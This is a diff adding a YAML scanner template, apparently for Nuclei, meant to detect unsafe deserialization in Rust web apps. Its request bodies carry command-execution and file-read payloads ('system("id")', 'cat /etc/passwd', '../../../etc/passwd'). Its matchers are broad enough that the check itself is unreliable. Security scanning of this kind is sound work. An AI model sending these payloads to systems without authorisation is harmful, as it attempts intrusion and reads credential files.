@@ -1,0 +1,46 @@
+id: rust-unsafe-deserialization
+info:
+  name: Rust Unsafe Deserialization
+  author: Guardian
+  severity: critical
+  description: Detects unsafe deserialization in Rust applications
+  tags: rust,serde,rce,deserialization
+
+requests:
+  - raw:
+      - |
+        POST /api/data HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"data": {"__unsafe_deserialization": "system(\"id\")"}}
+      - |
+        POST /api/data HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"config": {"___type": "SystemCommand", "command": "cat /etc/passwd"}}
+      - |
+        POST /api/parse HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"value": {"$type": "Arbitrary", "data": "../../../etc/passwd"}}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "uid="
+          - "gid="
+          - "root:"
+        part: body
+
+      - type: regex
+        regex:
+          - "(error|panicked|unsafe)"
+        part: body
+
+      - type: status
+        status:
+          - 500
